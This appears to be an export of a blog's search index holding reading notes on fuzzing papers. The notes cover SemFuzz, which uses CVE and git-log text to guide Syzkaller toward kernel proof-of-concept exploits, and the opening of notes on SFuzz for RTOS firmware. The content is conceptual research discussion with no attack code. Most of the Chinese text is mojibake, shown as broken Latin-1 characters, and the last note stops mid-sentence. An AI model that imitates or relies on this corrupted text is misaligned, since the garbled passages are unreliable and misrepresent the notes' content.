æè¿°æˆ–è¡¥ä¸æè¿°ä¸­æåˆ°çš„æŸä¸ªå˜é‡ï¼Œåˆ™æ›´æœ‰å¯èƒ½ä¸è¯¥è„†å¼±åŠŸèƒ½æœ‰å…³ã€‚ SemFuzz é¦–å…ˆåœ¨è§£ææ ‘ä¸­æœç´¢ä¿®è¡¥å‡½æ•°çš„åç§°ï¼Œå¹¶å°†å‘ç°çš„å‡½æ•°è§†ä¸ºè„†å¼±å‡½æ•°ã€‚å¦‚æœæ²¡æœ‰å‘ç°ï¼ŒSemFuzz å°†è§£ææ ‘ä¸­çš„åè¯ä¸è¡¥ä¸å‡½æ•°ä¸­çš„å˜é‡è¿›è¡Œæ¯”è¾ƒã€‚\næå–å…³é”®å˜é‡ å…³é”®å˜é‡éœ€è¦æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶\nå‡ºç°åœ¨æœªè¢«ä¿®è¡¥çš„è„†å¼±å‡½æ•°ä¸­ åœ¨ CVE æˆ– git æ—¥å¿—ä¸­æœ‰æ‰€æåŠ SemFuzz é¦–å…ˆä»æœªä¿®è¡¥çš„è„†å¼±å‡½æ•°ä¸­æå–æ‰€æœ‰å˜é‡ï¼Œæ„å»ºä¸€ä¸ªåŒ…å«å˜é‡å’Œå…¶ç±»å‹ä¿¡æ¯çš„ç¬¦å·è¡¨ã€‚ç„¶å SemFuzz æ£€æŸ¥ç¬¦å·è¡¨ä¸­çš„ä»»ä½•å˜é‡æ˜¯å¦å­˜åœ¨åœ¨è§£ææ ‘çš„åè¯æˆ–å½¢å®¹è¯ç»“ç‚¹ã€‚\næå–ç³»ç»Ÿè°ƒç”¨ å› ä¸º CVE å’Œ git æ—¥å¿—ä¸­å¯èƒ½ä¸ä¼šæ˜¾å¼çš„æåˆ°å¯ä»¥è§¦å‘æ¼æ´çš„ç³»ç»Ÿè°ƒç”¨ï¼Œæ‰€ä»¥ä½œè€…å»ºç«‹äº†ä¸€ä¸ªçŸ¥è¯†åº“ (ç³»ç»Ÿè°ƒç”¨åŠå…¶å‚æ•°ä¹‹é—´çš„å…³ç³»)ï¼Œç”¨äºå°† CVE æˆ– git æ—¥å¿—æè¿°ä¸­çš„å…³é”®å­—ä¸ç‰¹å®šé¢†åŸŸçš„æ¦‚å¿µå…³è”èµ·æ¥ã€‚ ä½œè€…åŸºäº Linux ç¨‹åºå‘˜æ‰‹å†Œ LPM æ¥æ„å»ºçŸ¥è¯†åº“ï¼š\nLPM çš„ç³»ç»Ÿè°ƒç”¨çš„ SYNOPSIS å­—æ®µè¿›è¡Œäº†å£°æ˜ï¼Œè‹¥å‚æ•°ä¸­æœ‰æšä¸¾ç±»å‹ï¼Œåˆ™ DESCRIPTION å­—æ®µåˆ—ä¸¾äº†ç±»å‹ä¸ºæšä¸¾çš„å‚æ•°çš„æ‰€æœ‰å€¼ï¼Œå°†è¿™äº›æšä¸¾å€¼ä¸ç³»ç»Ÿè°ƒç”¨ç›¸å…³è”ã€‚ ç³»ç»Ÿè°ƒç”¨çš„ see also å­—æ®µåŒ…å«äº†å…¶ä»–ç›¸å…³ä¿¡æ¯ï¼Œåœ¨ SEE ALSO å­—æ®µçš„å…¶ä»– LPM é¡µé¢ä¸­ä¹Ÿä¼šå­˜åœ¨ç›¸å…³çš„ç³»ç»Ÿè°ƒç”¨ï¼Œè¯†åˆ« synopsis å­—æ®µçš„ç¤ºä¾‹ä»£ç å’Œ description å­—æ®µä¸­çš„å…³é”®ç»“æ„çš„ç‰¹æ®Šå€¼ï¼Œå¹¶å°†å…¶ä¸ LMP åç§°å…³è” å½“ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨çš„å‚æ•°åç­‰äºå¦ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨çš„è¿”å›å˜é‡åæ—¶ï¼ŒSemFuzz æ¡¥æ¥ä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨ä¹‹é—´çš„å…³è”ã€‚ åœ¨ä»¥è¿™ç§æ–¹å¼åˆ†æäº†æ‰€æœ‰é¡µé¢ä¹‹åï¼ŒSemFuzz èƒ½å¤Ÿåœ¨ä½¿ç”¨ POS æ ‡ç­¾ NN (å³åè¯)åœ¨è§£ææ ‘çš„å¶ä¸­è¯†åˆ«å…³é”®å­—æ—¶æ£€ç´¢ç³»ç»Ÿè°ƒç”¨åŠå…¶å‚æ•°ã€‚ ä½¿ç”¨è¿™ç§æ–¹æ³•ï¼ŒSemFuzz è‡ªåŠ¨åˆ†æ1082ä¸ª LPM é¡µé¢ï¼Œå¹¶å°†373ä¸ªç³»ç»Ÿè°ƒç”¨ä¸2000å¤šä¸ªå…³é”®å­—å…³è”èµ·æ¥ï¼Œè¿™æ¯”ä»…ä½¿ç”¨ç³»ç»Ÿè°ƒç”¨åä½œä¸ºå…³é”®å­—çš„æ¬¡æ•°è¦å¤šã€‚ä»æˆ‘ä»¬å¯¹112ä¸ª cve çš„è¯„ä¼°ä¸­ï¼ŒSemFuzz å¯ä»¥æˆåŠŸæ£€ç´¢å…¶ä¸­96ä¸ª (86%)çš„ç³»ç»Ÿè°ƒç”¨ï¼Œä»¥è¿›è¡Œè¿›ä¸€æ­¥çš„æ¨¡ç³Šå¤„ç†ã€‚\nè¯­ä¹‰å¼•å¯¼çš„æ¨¡ç³Šæµ‹è¯• SemFuzz ä» CVE å’Œ Linux git æ—¥å¿—ä¸­çš„éä»£ç æ–‡æœ¬ä¸­æå–å¿…è¦çš„ä¿¡æ¯æˆ–æŒ‡å—ï¼Œä»¥æŒ‡å¯¼æ¨¡ç³Šå¤„ç†è¿‡ç¨‹ã€‚ç‰¹åˆ«æ˜¯ï¼Œæ£€ç´¢åˆ°çš„â€œå—å½±å“ç‰ˆæœ¬â€å¸®åŠ© SemFuzz è®¾ç½®æ­£ç¡®çš„æµ‹è¯•ç¯å¢ƒã€‚ç„¶å SemFuzz ä½¿ç”¨æ£€ç´¢åˆ°çš„â€œç³»ç»Ÿè°ƒç”¨â€ç”Ÿæˆç¬¬ä¸€ä¸ªè¾“å…¥ (å³ç§å­è¾“å…¥)ã€‚åœ¨æ¨¡ç³Šå¤„ç†è¿‡ç¨‹ä¸­ï¼ŒSemFuzz å¯¹è¾“å…¥æ‰§è¡Œç²—çªå˜ï¼Œä»¥æ‰¾åˆ°å¯ä»¥å°†æ‰§è¡Œç§»å‘â€œè„†å¼±å‡½æ•°â€çš„ç³»ç»Ÿè°ƒç”¨åºåˆ—ã€‚åœ¨æ­¤ä¹‹åï¼ŒSemFuzz é€šè¿‡ç›‘è§†â€œå…³é”®å˜é‡â€ç»§ç»­å¯¹ç³»ç»Ÿè°ƒç”¨åºåˆ—æ‰§è¡Œç»†ç²’åº¦çªå˜ï¼Œç›´åˆ°æ ¹æ®â€œæ¼æ´ç±»å‹â€æŒ‡å®šçš„æ”»å‡»ç»“æœçš„æ ‡å¿—å‘ç°ç›®æ ‡æ¼æ´è¢«è§¦å‘ã€‚\nè®¾ç½®æµ‹è¯•ç¯å¢ƒ åŠ è½½ä¸€ä¸ªæ˜“å—æ”»å‡»çš„ Linux å†…æ ¸å¹¶è¿›è¡Œä¸€ç³»åˆ—ç³»ç»Ÿè°ƒç”¨ åœ¨è™šæ‹Ÿæœºå†…éƒ¨æ„å»º Linux å†…æ ¸ï¼Œå¹¶è®© SemFuzz ä»å¤–éƒ¨ (å³åœ¨ä¸»æœºä¸Š)åŠ è½½å®ƒ é¢„å…ˆæ„å»ºäº†103ä¸ª Linux å†…æ ¸ç‰ˆæœ¬ï¼Œä»¥é¿å…å†—ä½™æ„å»ºä»¥èŠ‚çœæ—¶é—´ å½“ä» CVE ä¸­æ£€ç´¢åˆ°ç‰ˆæœ¬å·æ—¶ï¼ŒSEMFUzz çš„ out-box åŠ è½½å™¨åŠ è½½å¯¹åº”ç‰ˆæœ¬ï¼Œç„¶å in-box å‘å†…æ ¸å‘é€ä¸€ç³»åˆ—ç³»ç»Ÿè°ƒç”¨ è§‚å¯Ÿå†…æ ¸çš„æ‰§è¡ŒçŠ¶æ€ï¼ŒåŒ…æ‹¬æ‰§è¡Œçš„å‡½æ•°ã€å…³é”®å˜é‡çš„å€¼å’Œå†…æ ¸çš„å¼‚å¸¸äº‹ä»¶ ä¸ºäº†ç›‘æ§æ‰§è¡Œçš„å‡½æ•°ï¼Œåˆ©ç”¨ KCOVï¼ˆå†…æ ¸ä»£ç è¦†ç›–ï¼‰æ¥è·Ÿè¸ªå†…æ ¸ä¸­æ‰§è¡Œçš„ä»£ç  ä¸ºäº†è·Ÿè¸ªå…³é”®å˜é‡ï¼Œä½œè€…å»è§‚å¯Ÿå†…æ ¸å‡½æ•°çš„å‚æ•°ï¼Œè€Œä¸æ˜¯å…³é”®å˜é‡ åŸå›  åœ¨æºä»£ç ä¸­å¯¹å…³é”®å˜é‡æ’æ¡©ä¸çµæ´»ï¼Œæ¯æ¬¡è§‚å¯Ÿä¸åŒçš„å˜é‡éƒ½è¦é‡æ–°ç¼–è¯‘ åŠ¨æ€æ£€æµ‹ï¼Œåœ¨è¿è¡Œæ—¶å®šä½å…³é”®å˜é‡ï¼Œä½†æ˜¯è¿™æ ·çš„å˜é‡å¯èƒ½ä¼šåœ¨ç¼–è¯‘çš„æ—¶å€™è¢«ä¼˜åŒ–æ‰ æ“ä½œ å¯¹å…³é”®å˜é‡æ‰§è¡Œå‘åçš„è¿‡ç¨‹å†…æ•°æ®æµå’Œæ§åˆ¶æµåšé™æ€åˆ†æï¼Œæ‰¾åˆ°å…³é”®å˜é‡ä¾èµ–çš„å‚æ•° ä¸ºäº†æ•è·å†…æ ¸çš„å¼‚å¸¸æ—¶é—´ï¼Œsemfuzz åœ¨è™šæ‹Ÿæœºä¹‹å¤–ç›‘è§†å†…æ ¸ å®ç° åŸºäºæœ€å…ˆè¿›çš„ Linux ç³»ç»Ÿè°ƒç”¨ fuzzer Syzkaller æ„å»º SemFuzzã€‚å¯¹äº in-box observer, Syzkaller å¯ä»¥ç›´æ¥è°ƒç”¨ KCOV çš„ APIï¼Œè·å–å†…æ ¸çš„æ‰§è¡ŒçŠ¶æ€ã€‚é™¤æ­¤ä¹‹å¤–ï¼ŒSyzkaller å¯ä»¥é€šè¿‡éšæœºæ·»åŠ ã€åˆ é™¤æˆ–æ”¹å˜ç³»ç»Ÿè°ƒç”¨åŠå…¶åºåˆ—ä¸­çš„å‚æ•°æ¥æ‰§è¡Œæ¨¡ç³Šã€‚è‡³äº out-box observerï¼ŒSyzkaller ç›‘è§†å†…æ ¸æ˜¯å¦å´©æºƒæˆ–æŒ‚èµ·ï¼Œè¿˜æ£€æŸ¥å†…éƒ¨å†…æ ¸é”™è¯¯æ£€æµ‹å™¨çš„è¾“å‡º (ä¾‹å¦‚ï¼ŒKASAN ç”¨äºæ£€æµ‹å†…å­˜é”™è¯¯ï¼ŒUBSAN ç”¨äºæ£€æµ‹æœªå¤„ç†çš„è¡Œä¸ºï¼Œå¦‚æ•´æ•°è¶…è¿‡ (ow))ã€‚\nç”Ÿæˆç§å­è¾“å…¥ ç§å­è¾“å…¥æ˜¯é€šè¿‡ä»¥ä¸‹ä¸¤ä¸ªæ­¥éª¤æ„å»ºçš„ã€‚\næ‰€æœ‰æ£€ç´¢åˆ°çš„ç³»ç»Ÿè°ƒç”¨ (ä»¥åŠæ£€ç´¢åˆ°çš„å‚æ•°å€¼)è¢«æ”¾åœ¨ä¸€èµ·ä½œä¸ºä¸å®Œæ•´çš„ç§å­è¾“å…¥ã€‚ å¦‚æœå‚æ•°æ˜¯ä¸€ä¸ªç»“æ„ï¼Œåˆ™å¡«å……ç»“æ„ä¸­çš„æ¯ä¸ªå­—æ®µã€‚å¯¹äºæšä¸¾å­—æ®µï¼Œç”¨ä» LPM å­¦åˆ°çš„ç›¸å…³æšä¸¾å€¼å¡«å……ã€‚å¯¹äºå…¶ä»–å­—æ®µï¼Œä½¿ç”¨ä¸å…¶ç±»å‹å…¼å®¹çš„éšæœºå€¼å¡«å……ã€‚ å…¶æ¬¡ï¼ŒSemFuzz å°†å…¶ä»–ç³»ç»Ÿè°ƒç”¨ä¸æ£€ç´¢åˆ°çš„ç³»ç»Ÿè°ƒç”¨å…³è”èµ·æ¥ï¼Œå¹¶å°†å®ƒä»¬æ”¾å…¥ç§å­è¾“å…¥ä¸­ã€‚å¦‚ç¬¬4èŠ‚æ‰€è¿°ã€‚ ä¸ºä»€ä¹ˆè¦è¿™ä¹ˆåšçš„ï¼Œå› ä¸ºä¸€ä¸ªç³»ç»Ÿè°ƒç”¨å¯èƒ½æ— æ³•æ­£ç¡®æ‰§è¡Œï¼Œæ¯”å¦‚æ¼æ´å‡½æ•°ç›¸å…³çš„ç³»ç»Ÿè°ƒç”¨æ˜¯ sendï¼Œä½†æ˜¯å…‰æœ‰ send ä¸è¡Œï¼Œsend ä¹‹å‰è¿˜å¾—æœ‰ bindï¼Œæ‰€ä»¥è¾“å…¥çš„ç§å­å¾—æ˜¯ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨åºåˆ— ä½œè€…è¿›ä¸€æ­¥å°†è¿™ç§ç›¸å…³æ€§æ‰©å±•åˆ°å…±äº«ç›¸åŒç±»å‹çš„ç³»ç»Ÿèµ„æº (ä¾‹å¦‚ï¼Œæ–‡ä»¶ï¼Œå¥—æ¥å­—)çš„ç³»ç»Ÿè°ƒç”¨ã€‚é€šè¿‡è¿™ç§æ–¹å¼ï¼Œæ‰€æœ‰ç›¸å…³çš„ç³»ç»Ÿè°ƒç”¨éƒ½æ”¾åœ¨ç§å­è¾“å…¥ä¸­ã€‚è™½ç„¶è¿™å¯èƒ½ä¼šå¸¦æ¥ä¸€äº›æ— ç”¨çš„ç³»ç»Ÿè°ƒç”¨æ¥è§¦å‘æ¼æ´ï¼Œä½†å®ƒå¢åŠ äº†å‘½ä¸­è„†å¼±å‡½æ•°çš„æ¦‚ç‡ã€‚ ç²—ç²’åº¦å˜å¼‚ è¿™ä¸€æ­¥çš„ç›®æ ‡æ˜¯ç”Ÿæˆä¸€ä¸ªå¯ä»¥è®©æ‰§è¡Œåˆ°è¾¾æ˜“å—æ”»å‡»å‡½æ•°çš„è¾“å…¥ æŠŠæ¯æ¬¡ä½¿ç”¨è¾“å…¥çš„è¿è¡Œéƒ½ç§°ä¸ºä¸€ä¸ªæ¨¡ç³Šå®ä¾‹ã€‚ç„¶åï¼Œå¯¹äºæ¯ä¸ªå®ä¾‹ï¼Œæˆ‘ä»¬é€šè¿‡ in-box observer è§‚å¯Ÿ Linux å†…æ ¸çš„æ‰§è¡Œæƒ…å†µï¼Œå¹¶æµ‹é‡è„†å¼±å‡½æ•°ä¸æ¨¡ç³Šå®ä¾‹çš„æ‰§è¡Œè½¨è¿¹ä¹‹é—´çš„è·ç¦»ã€‚é€‰æ‹©ä¸æœ€çŸ­è·ç¦»å¯¹åº”çš„è¾“å…¥ä½œä¸ºæ–°çš„ç§å­è¾“å…¥è¿›è¡Œä¸‹ä¸€è½®æ¨¡ç³Šï¼Œç›´åˆ°è¾¾åˆ°ä»»ä½•è„†å¼±å‡½æ•°ã€‚\nå°†ä¸¤ä¸ªèŠ‚ç‚¹ dist (n1, n2)çš„è·ç¦»å®šä¹‰ä¸º n1åˆ° n2ä¹‹é—´æœ€çŸ­è·¯å¾„ä¸Šçš„èŠ‚ç‚¹æ•° åŸºäºè·ç¦»ï¼Œä½œè€…ç»™å‡ºäº†ä¼˜å…ˆçº§çš„è®¡ç®—å…¬å¼ é‚£ä¹ˆç³»ç»Ÿè°ƒç”¨åºåˆ— s ï¼ˆè¾“å…¥ï¼‰çš„ä¼˜å…ˆçº§å…¬å¼ä¸ºï¼š KCOV (s)æ˜¯è¾“å…¥ s åœ¨æ¨¡ç³Šå®ä¾‹ä¸­æ‰§è¡Œçš„å‡½æ•°é›† RCG (f)ä¸º f çš„åå‘è°ƒç”¨å›¾ä¸­çš„å‡½æ•°é›† é‚£ä¹ˆå…¬å¼çš„æ„æ€å°±æ˜¯è¾“å…¥ s çš„ä¼˜å…ˆé›†æ˜¯ s åœ¨æ¨¡ç³Šå®ä¾‹ä¸­æ‰§è¡Œçš„å‡½æ•°ä¼˜å…ˆçº§çš„æœ€å¤§å€¼ ç»†ç²’åº¦å˜å¼‚ åœ¨æ‰¾åˆ°å…è®¸å†…æ ¸è¿è¡Œæ˜“å—æ”»å‡»å‡½æ•°çš„è¾“å…¥ I ä¹‹åï¼Œ SemFuzz é€šè¿‡ç›‘è§†å…³é”®å˜é‡çš„åé¦ˆæ¥è¿›è¡Œç»†ç²’åº¦çš„å˜å¼‚ã€‚ ç»†ç²’åº¦çš„å˜å¼‚ä¸ä¼šæ·»åŠ æˆ–åˆ é™¤è¾“å…¥ä¸­çš„ç³»ç»Ÿè°ƒç”¨ï¼Œè€Œæ˜¯å»ä¿®æ”¹å‚æ•°å€¼ã€‚ åœ¨æ‰¾åˆ°å…è®¸å†…æ ¸è¿è¡Œæ˜“å—æ”»å‡»å‡½æ•°çš„è¾“å…¥ I ä¹‹åï¼ŒSemFuzz ç»§ç»­ä½¿ç”¨æ¥è‡ªç›‘è§†â€œå…³é”®å˜é‡â€çš„åé¦ˆæ¥æ›´æ”¹è¾“å…¥ã€‚ ä½¿ç”¨åŸºæœ¬å—ä¹‹é—´çš„è·ç¦»æ¥æµ‹é‡è¾“å…¥è´¨é‡ï¼Œä» b1åˆ° b2çš„æœ€çŸ­è·¯å¾„ä¸Šçš„åŸºæœ¬å—çš„æ•°é‡æ¥æµ‹é‡ä¸¤ä¸ªåŸºæœ¬å— (b1å’Œ b2)ä¹‹é—´çš„è·ç¦»ï¼Œè®°ä¸º distB (b1, b2)ã€‚ åˆ™è¾“å…¥çš„ä¼˜å…ˆçº§ç”±ä»¥ä¸‹ä¸¤ä¸ªå…¬å¼ç¡®å®šï¼š KCOVB (s)ä¸ºç³»ç»Ÿè°ƒç”¨åºåˆ— s ä¸­è¦†ç›–çš„åŸºæœ¬å—çš„é›†åˆ å‡½æ•° f çš„ä¿®è¡¥ä»£ç åœ¨åŸºæœ¬å—é›†åˆ PATCH = {p1, p2ï¼Œâ€¦ï¼Œ pn} e æ˜¯ entry è¯„ä¼° æ•ˆç‡ exp ç”Ÿæˆçš„æœ‰æ•ˆæ€§ æ­¤å¤„ä½œè€…åˆ†æäº† semfuzz ä¸ºä»€ä¹ˆæ²¡æœ‰ç»™å‡ºå…¶ä½™ 94 ä¾‹ cve çš„åŸå› ï¼š\næŸäº›æ¼æ´åªæœ‰åœ¨è¾“å…¥ (ç‰¹åˆ«æ˜¯ç³»ç»Ÿè°ƒç”¨çš„å‚æ•°)æ»¡è¶³ç‰¹å®šæ¡ä»¶æ—¶æ‰ä¼šè§¦å‘ï¼Œè¿™æ˜¯ SemFuzz åœ¨æœ‰é™çš„æ—¶é—´å†…éš¾ä»¥ç”Ÿæˆçš„ã€‚ æŸäº›æ¼æ´åªæœ‰åœ¨å‡ºç°ç«æ€æ¡ä»¶æ—¶æ‰æœ‰å¯èƒ½å‡ºç°ã€‚ç”±äºå¹¶å‘æ‰§è¡Œçš„ä¸ç¡®å®šæ€§ï¼ŒSemFuzz ä»ç„¶éœ€è¦æ›´å¤šçš„æ—¶é—´æ¥è§¦å‘è¿™äº›æ¡ä»¶ã€‚ é€šè¿‡é€‰æ‹©æ€§ç¬¦å·æ‰§è¡Œå’Œæ“çºµçº¿ç¨‹è°ƒåº¦æ¥å¢å¼ºæ¨¡ç³Šçš„ç ”ç©¶æœ‰åŠ©äºè¿›ä¸€æ­¥æé«˜ SemFuzz çš„æ€§èƒ½ã€‚ ä¿¡æ¯å–çš„æœ‰æ•ˆæ€§ ç²¾åº¦é«˜\næ€§èƒ½ æ€§èƒ½å¥½\nfind è¿™é‡Œä½œè€…åˆ†æäº†ä¸€ä¸‹ cve å’Œ git æ—¥å¿—ä¸­çš„å†…å®¹å¯¹ç”Ÿæˆ exp çš„å½±å“ã€‚è¿™éƒ¨åˆ†æˆ‘æ„Ÿè§‰å¾ˆå¥½ï¼Œè¯¦å®äº†è®ºæ–‡å†…å®¹ï¼Œå±äºæ˜¯é”¦ä¸Šæ·»èŠ±ã€‚\nè®¨è®º ä¸èƒ½è§¦å‘è®¾å¤‡å¼•èµ·çš„æ¼æ´ï¼Œä¸èƒ½è§¦å‘é€»è¾‘æ¼æ´ å¯ä»¥å°†åŸºäºè¯­ä¹‰çš„ fuzz æ¨å¹¿åˆ°å…¶ä»– fuzz å¯¹è±¡ é™¤äº† cve å’Œ git æ—¥å¿—è¿˜å¯ä»¥å¢åŠ æ›´å¤šçš„ä¿¡æ¯æ¥æº ç›®çš„ï¼š æ–¹æ³•ï¼š æ„ä¹‰ï¼š æ•ˆæœï¼š\nå¯ä»¥å¯¹ semfuzz è¿›è¡Œæ‹“å±•ï¼Œå®ƒåªæ”¯æŒ Linux å†…æ ¸ semfuzz çš„å†…å®¹æå–éƒ¨åˆ†æ¯”è¾ƒç®€å•ï¼Œä¸å¤Ÿå¤æ‚ æå–çš„æ—¶å€™å“ªé‡Œç”¨åˆ° NLP äº†ï¼Ÿ æå–ç³»ç»Ÿè°ƒç”¨é‚£é‡Œä¹Ÿæœ‰ç‚¹ç®€å•ï¼Ÿ ç”Ÿæˆç§å­çš„æ—¶å€™ç³»ç»Ÿè°ƒç”¨åºåˆ—çš„é¡ºåºæ²¡æœ‰å¾ˆå¥½çš„å»å¤„ç†ï¼Œå¹¶ä¸”æœ‰ç‚¹å†—ä½™ï¼Œå½±å“æ€§èƒ½äº† ç²—ç²’åº¦å˜å¼‚é‚£é‡Œæ˜¯å¦‚ä½•è¡¡é‡è·ç¦»çš„ åå‘å¯è¾¾æ€§åˆ†æäº†è§£ä¸€ä¸‹ Effective of exploit generation ä¸­åˆ†æçš„ poc æ²¡æœ‰ç”Ÿæˆçš„åŸå› æ˜¯ä¸‹ä¸€æ­¥ç ”ç©¶çš„æ–¹å‘\n","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/semfuzz-semantics-based-automatic-generation-of-proof-of-concept-exploits/","summary":"ä¸­æ–‡è¯‘åï¼šSemFuzz:åŸºäºè¯­ä¹‰çš„æ¦‚å¿µéªŒè¯æ¼æ´è‡ªåŠ¨ç”Ÿæˆ ä½œè€…ï¼šwei you btw äºŒä½œå’Œä¸‰ä½œæ˜¯ IIEï¼Œä¸‰ä½œæ˜¯é™ˆå‡¯ å•ä½ï¼šå°ç¬¬å®‰çº³å¤§å­¦ä¼¯æ˜é¡¿åˆ†æ ¡ å›½å®¶ï¼š #ç¾","title":"SemFuzz Semantics-based Automatic Generation of Proof-of-Concept Exploits"},{"content":" information source common vulnerabilities and exposures (CVE) systems CVE - CVE (mitre.org) Linux git logs CVE - CVE (mitre.org) bug descriptions posted on forums and blogs SEMANTIC INFORMATION RETRIEVING NLP tool process these information, output calling sequence. so, fuzzer utilizes the sequences to guidline the fuzz this part i want know how the fuzzer use these sequences, how two prune the unreachable path I noticed that the example both have cve report and git log Generating parse tree: the tool is pyStatParserï¼Œauthor use it to generate the syntax tree Retrieving affected version: basically, match through regular expressions Retrieving vulnerability type: from the 70 types of Linux kernel related CWEs, author choosed 16 types as the default type of semfuzz and semfuzz identified through the parse tree. If there it no vulnerability in the parse tree, semfuzz check out in the NVD. why choose the 16 kinds of types How can semfuzz check out vulnerability type in NVD, artificial or automatic? Retrieving vulnerable functionsï¼šby compare the patched program and the unpatched program firstly, semfuzz search the patched function name in the parse tree if can not find, secondly, search the patched function\u0026rsquo;s variables in the parse tree Retrieving critical variables: follow two rules: a. variable appears in a unpatched vulnerable function; b. variable also mentioned in the description of information firstly, semfuzz retrieve all variables in the unpatched functions and build a symbol table. then, searche the parse tree note that a variable must be a noun or an adjective in a phrase Retrieving system calls: author build a system calls database for reveal the relationship between variables and systemcalls and search the system call in the database useing the variables semfuzz based on the kernel fuzzer Syzkaller Generating Seed Input: use the retrieved system calls as a imcomplete seed and crrelates other relative systemcalls as the complete seed Coarse-level Mutation: change the system calls sequences, compare the execution trace of fuzzing instance and target, calculate the distance Fine-grained Mutation: change the parameter and compare the basic block number what can i improve the methd to generate syntax tree or we don\u0026rsquo;t use syntax tree before generate syntax tree, we can delete the irrelevant infromation firstly semfuzz need both git logs and cve report maye can use less information the method of retrieving vulnerable functions maybe can improve if i extend this approach to other software, maybe don\u0026rsquo;t need retrieve system calls the method of retrieving information too simple and rough and lack of semantics although it called semfuzz the improve about the fuzz method is almost nothing, just use the result of retrive information as the fuzz seed ","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/3.%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0/semfuzz-%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0/","summary":"information source common vulnerabilities and exposures (CVE) systems CVE - CVE (mitre.org) Linux git logs CVE - CVE (mitre.org) bug descriptions posted on forums and blogs SEMANTIC INFORMATION RETRIEVING NLP tool process these information, output calling sequence. so, fuzzer utilizes the sequences to guidline the fuzz this part i want know how the fuzzer use these sequences, how two prune the unreachable path I noticed that the example both have","title":"SemFuzz æ€»ç»“ç¬”è®°"},{"content":"åŸºäºSFuzzåˆ‡ç‰‡çš„å®æ—¶æ“ä½œç³»ç»Ÿæ¨¡ç³Š\nAbstract èƒŒæ™¯ï¼šåµŒå…¥å¼ç³»ç»Ÿå¤§å¤šæ˜¯å®æ—¶æ“ä½œç³»ç»Ÿã€‚\né—®é¢˜ï¼šRTOSçš„å•ä½“è®¾è®¡å°†å„ç§ä»»åŠ¡å’ŒæœåŠ¡ç»“åˆæˆä¸€ä¸ªå•ä¸€çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œè¿™é˜»ç¢äº†ç›®å‰åœ¨RTOSç³»ç»Ÿä¸Šçš„ç¨‹åºæµ‹è¯•å’Œåˆ†ææŠ€æœ¯ã€‚\nç›®çš„ï¼šæå‡ºäº†SFuzzï¼Œä¸€ç§æ–°å‹çš„åŸºäºåˆ‡ç‰‡çš„æ¨¡ç³Šå™¨ï¼Œç”¨äºæ£€æµ‹RTOSç³»ç»Ÿçš„å®‰å…¨æ¼æ´ã€‚ä½œè€…è®¤ä¸ºRTOSé€šå¸¸å°†ä¸€ä¸ªå¤æ‚çš„äºŒè¿›åˆ¶æ–‡ä»¶åˆ’åˆ†ä¸ºè®¸å¤šåˆ†ç¦»ä½†ä¸€å¿ƒä¸€æ„çš„ä»»åŠ¡ã€‚æ¯ä¸ªä»»åŠ¡ä»¥ç¡®å®šçš„æ–¹å¼å®Œæˆä¸€ä¸ªç‰¹å®šçš„äº‹ä»¶ï¼Œå…¶æ§åˆ¶æµé€šå¸¸æ˜¯ç›´æ¥å’Œç‹¬ç«‹çš„ã€‚å› æ­¤ï¼Œä½œè€…ä»å•ä¸€çš„RTOSäºŒè¿›åˆ¶æ–‡ä»¶ä¸­è¯†åˆ«å‡ºè¿™æ ·çš„ä»£ç ï¼Œå¹¶åˆæˆä¸€ä¸ªåˆ‡ç‰‡è¿›è¡Œæœ‰æ•ˆçš„æµ‹è¯•ã€‚\næ–¹æ³•ï¼šSFuzzé¦–å…ˆè¯†åˆ«å¤„ç†ç”¨æˆ·è¾“å…¥çš„å‡½æ•°ï¼Œæ„å»ºä»è¿™äº›å‡½æ•°çš„è°ƒç”¨è€…å¼€å§‹çš„è°ƒç”¨å›¾ï¼Œå¹¶åˆ©ç”¨å‰å‘åˆ‡ç‰‡æ¥æ„å»ºåŸºäºè°ƒç”¨å›¾çš„æ‰§è¡Œæ ‘ï¼Œå¹¶ä¿®å‰ªç‹¬ç«‹äºå¤–éƒ¨è¾“å…¥çš„è·¯å¾„ã€‚ç„¶åï¼Œå®ƒæ£€æµ‹ç²—ç²’åº¦èŒƒå›´å†…é˜»ç¢æœ‰æ•ˆæ¨¡ç³Šå¤„ç†çš„è·¯éšœï¼Œå¦‚ä¸ç”¨æˆ·è¾“å…¥æ— å…³çš„æŒ‡ä»¤ã€‚ç„¶åï¼Œå®ƒåœ¨è¿™äº›ä»£ç ç‰‡æ®µä¸Šè¿›è¡Œè¦†ç›–ç‡å¼•å¯¼çš„æ¨¡ç³Šå¤„ç†ã€‚æœ€åï¼ŒSFuzzåˆ©ç”¨å‰å‘å’Œåå‘åˆ‡ç‰‡æ¥è·Ÿè¸ªå’ŒéªŒè¯æ¯ä¸ªè·¯å¾„çº¦æŸï¼Œå¹¶ç¡®å®šåœ¨æ¨¡ç³Šå™¨ä¸­å‘ç°çš„é”™è¯¯æ˜¯å¦æ˜¯çœŸæ­£çš„æ¼æ´ã€‚\nç†è§£ï¼šè²Œä¼¼ä½œè€…é¦–å…ˆä»ç”¨æˆ·è¾“å…¥çš„å‡½æ•°å¼€å§‹æ„å»ºè°ƒç”¨å›¾ï¼Œç„¶ååŸºäºè°ƒç”¨å›¾åˆ©ç”¨å‰å‘åˆ‡ç‰‡æ„å»ºæ‰§è¡Œæ ‘ï¼Œ\nINTRODUCTION ä¼ ç»Ÿé™æ€åˆ†æçš„æŒ‘æˆ˜ï¼šå•ä½“RTOSäºŒè¿›åˆ¶çš„å¤§å°ºå¯¸ï¼ˆè·¯å¾„çˆ†ç‚¸ï¼‰ã€éš¾è¯†åˆ«å‡½æ•°è¯­ä¹‰ã€æ— 